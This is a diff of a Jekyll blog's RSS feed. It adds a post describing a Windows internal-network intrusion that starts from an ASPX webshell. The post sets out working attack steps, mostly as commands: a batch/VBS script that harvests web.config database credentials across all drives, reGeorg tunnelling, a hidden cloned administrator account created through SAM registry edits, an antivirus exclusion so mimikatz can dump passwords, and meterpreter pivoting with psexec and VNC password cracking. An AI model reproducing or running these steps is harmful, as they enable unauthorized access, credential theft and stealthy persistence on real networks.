@@ -5,9 +5,159 @@
     <description>A blog about programming and network security</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 09 Apr 2016 22:01:51 +0800</pubDate>
-    <lastBuildDate>Sat, 09 Apr 2016 22:01:51 +0800</lastBuildDate>
+    <pubDate>Sun, 10 Apr 2016 13:54:22 +0800</pubDate>
+    <lastBuildDate>Sun, 10 Apr 2016 13:54:22 +0800</lastBuildDate>
     <generator>Jekyll v3.1.2</generator>
+    
+      <item>
+        <title>Inside network in workgroup</title>
+        <description>&lt;h2 id=&quot;x01-base&quot;&gt;0x01 Base&lt;/h2&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;got a webshell of xxx.xxx.xxx.101(run aspx)  
+don&#39;t know how to get system shell from this webshell  
+there exists not only one site on xxx.xxx.xxx.101  
+find xxx.xxx.xxx.101 has another address 10.10.10.101
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h2 id=&quot;x02-steps&quot;&gt;0x02 Steps&lt;/h2&gt;
+
+&lt;h3 id=&quot;search-webconfig-on-all-sites-to-find-sa-and-sapass&quot;&gt;1&amp;gt;search web.config on all sites to find sa and sapass&lt;/h3&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;1.bat
+@echo off
+goto :main
+这是注释：(for /f &quot;delims=&quot;的作用为取消默认的以空格等符号作为分割符
+dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
+:main
+set str=c d e f g h i j k l m n o p q r s t u v w x y z 
+echo  当前硬盘的分区有： 
+for %%i in (%str%) do (
+if exist %%i: (echo %%i:
+for /f &quot;delims=&quot; %%j in (&#39;dir /b /s &quot;%%i:\web.conf?g&quot;&#39;) do (
+echo *****filepath***** &amp;gt;&amp;gt; tmp.txt
+echo %%j &amp;gt;&amp;gt; tmp.txt
+type &quot;%%j&quot; &amp;gt;&amp;gt; tmp.txt
+echo. &amp;gt;&amp;gt; tmp.txt
+echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
+echo 我是美丽的分割线 &amp;gt;&amp;gt; tmp.txt
+echo ---------------------------- &amp;gt;&amp;gt; tmp.txt
+echo. &amp;gt;&amp;gt; tmp.txt
+)
+)
+)
+
+2.vbs
+Set ws = CreateObject(&quot;Wscript.Shell&quot;)
+ws.run &quot;cmd /c 1.bat&quot;,vbhide
+
+cscript 2.vbs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h5 id=&quot;or-download-fromhttpsgithubcomxinghuacaibattreemastergetwebconfigbat&quot;&gt;or download from:&lt;code class=&quot;highlighter-rouge&quot;&gt;https://github.com/xinghuacai/bat/tree/master/get_web_config_bat&lt;/code&gt;&lt;/h5&gt;
+
+&lt;h4 id=&quot;find-sa-and-sapass-of-1010101but-as-a-inside-network-pc3389-is-not-allowed-from-outside&quot;&gt;[+] find sa and sapass of 10.10.10.1,but as a inside network pc,3389 is not allowed from outside&lt;/h4&gt;
+
+&lt;h3 id=&quot;upload-a-tunnelaspxfrom-regeorg-to--xxxxxxxxx101&quot;&gt;2&amp;gt;upload a tunnel.aspx(from reGeorg) to  xxx.xxx.xxx.101&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[python] reGeorg.py -p 1080 -u http://xxx.xxx.xxx.101/xx/tunnel.aspx
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;use-sa-pri-in-chopper-execute&quot;&gt;3&amp;gt;use sa pri in chopper execute:&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;net user tmp /add &amp;amp; net localgroup administrators tmp /add  
+net localgroup &quot;remote desktop users&quot; tmp /add
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;runas-admin-cmd--mstsc-console-v1010101--admin&quot;&gt;4&amp;gt;runas admin-&amp;gt;cmd-&amp;gt; mstsc /console /v:10.10.10.1 -admin&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[10.10.10.1:3389 with tmp account]:  
+add a superhide administrator account cloned from administrator account:  
+net user tmp$ /add &amp;amp; net localgroup administrators tmp$ /add
+regedit-&amp;gt;local machine-&amp;gt;sam-&amp;gt;account-&amp;gt;name
+export 0x111&amp;lt;assume as administrator&#39;s&amp;gt; as admin.reg
+export 0x222&amp;lt;assume as tmp$&#39;s&amp;gt; as user.reg
+export account-&amp;gt;name-&amp;gt;tmp$ as tmp.reg
+copy /F value from admin.reg to user.reg
+net user tmp$ /del
+import tmp.reg and user.reg
+delete admin.reg,user.reg,tmp.reg
+logoff
+
+[10.10.10.1:3389 with tmp$ account]:  
+net user tmp /del
+open setup of eset to add exclude file path
+copy \\tsclient\mimikatz\ exclude_folder
+
+[run mimikatz]:  
+privilege::debug
+sekurlsa::logonpasswords
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;h3 id=&quot;upload-a-meterpreter-payload-to-1010101&quot;&gt;5&amp;gt;upload a meterpreter payload to 10.10.10.1&lt;/h3&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;meterpreter&amp;gt;run get_local_subnets
+            10.0.0.0/255.0.0.0
+meterpreter&amp;gt;background
+(handler)&amp;gt;route add 10.0.0.0 255.0.0.0 1
+(handler)&amp;gt;route print
+(handler)&amp;gt;use auxiliary/scanner/portscan/tcp
+set ports 25,110,21,80,8080,443,1433,3606,3389,5900
+set rhosts 10.10.10.0/24
+set threads 24
+exploit
+
+smb:
+(handler)use exploit/windows/smb/psexec
+(handler)set rhosts 10.10.10.0/24
+(handler)set username and pass from sekurlsa::logonpasswords in mimikatz before
+or the password find by mimikatz in msf:
+load  mimikatz
+mimikatz_command -f sekurlsa::searchPasswords
+(handler)exploit
+enter other pc by smbpass
+use mimikatz to find morepassword
+search regedit to find morevncpassword
+
+vnc:
+search winvnc password in 10.10.10.1:
+if ini file with password was delete,then open regedit search &quot;password&quot; 
+F3+F3+F3...
+find vnc password
+use vnccrack tool in cain to carck it
+get vncpassword
+use auxiliary/scanner/vnc/vnc_login
+set rhosts 10.10.10.0/24
+set password vpnpassword
+exploit
+enter other pc by vnc password
+use mimikatz to find morepassword
+search regedit to find morevncpassword
+
+smb&amp;amp;vnc
+use morepassword in exploit/windows/smb/psexec
+use morevncpassword in auxiliary/scanner/vnc/vnc_login
+
+
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+</description>
+        <pubDate>Sun, 10 Apr 2016 00:00:00 +0800</pubDate>
+        <link>/web/2016/04/10/windows-2003-inside-network-aspx/</link>
+        <guid isPermaLink="true">/web/2016/04/10/windows-2003-inside-network-aspx/</guid>
+        
+        <category>inside network</category>
+        
+        <category>windows</category>
+        
+        <category>aspx</category>
+        
+        <category>工作组</category>
+        
+        
+        <category>web</category>
+        
+      </item>
     
       <item>
         <title>windows 2003 r2 aspx</title>
@@ -309,12 +459,7 @@ and &lt;a href=&quot;http://en.wikipedia.org/wiki/Textile_(markup_language)&quot
     
       <item>
         <title>Using thumbnails</title>
-        <description>&lt;p&gt;#this is my added line…
-# this is my added line…&lt;/p&gt;
-
-&lt;h1 id=&quot;this-is-my-added-line&quot;&gt;this is my added line…&lt;/h1&gt;
-
-&lt;p&gt;Carte Noire is designed to start each article with an all-white image as a
+        <description>&lt;p&gt;Carte Noire is designed to start each article with an all-white image as a
 thumbnail. These are created by adding a &lt;code class=&quot;highlighter-rouge&quot;&gt;thumbnail&lt;/code&gt; parameter to the article’s
 &lt;a href=&quot;http://jekyllrb.com/docs/frontmatter/&quot;&gt;YAML frontmatter&lt;/a&gt;. This thumbnail parameter is processed in one of two ways,
 images specified in &lt;code class=&quot;highlighter-rouge&quot;&gt;_data/thumbnails.yml&lt;/code&gt; or using &lt;a href=&quot;http://fortawesome.github.io/Font-Awesome/&quot;&gt;Font Awesome&lt;/a&gt;.&lt;/p&gt;
